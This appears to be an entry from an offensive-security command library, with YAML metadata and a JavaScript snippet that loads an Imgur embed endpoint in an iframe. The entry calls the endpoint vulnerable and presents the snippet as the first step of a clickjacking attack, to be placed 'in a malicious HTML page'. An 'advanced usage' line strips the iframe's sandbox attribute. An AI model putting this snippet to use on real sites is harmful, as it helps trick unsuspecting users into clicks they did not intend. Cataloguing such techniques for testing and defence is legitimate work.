---
id: cmd-imgur-iframe-load
data: >-
  let ifr = document.createElement('iframe'); ifr.src =
  'http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540';
  document.body.appendChild(ifr); ifr.onload = function() { console.log('Iframe
  loaded'); };
tags:
  - iframe
  - clickjacking
type: command
output: Iframe element appended to DOM; console log 'Iframe loaded'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:13.037Z'
verified: false
validated: true
submitted: true
---
# Load Iframe with Imgur Embed

## Command

```javascript
let ifr = document.createElement('iframe');
ifr.src = 'http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540';
document.body.appendChild(ifr);
ifr.onload = function() { console.log('Iframe loaded'); };
```

## Description

Creates and loads an iframe sourcing the vulnerable Imgur embed endpoint to initiate clickjacking. Use in a malicious HTML page.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | URL of Imgur embed | Yes |
| onload | Callback on load | No |

## Examples

### Basic Usage

```javascript
// As above
```

### Advanced Usage

```javascript
// With sandbox removal later
ifr.removeAttribute('sandbox');
```

## Expected Output

Iframe renders content; console: 'Iframe loaded'. No X-Frame-Options error.

## Related

- [[Related Procedure: Setup ClickJacking Iframe]]
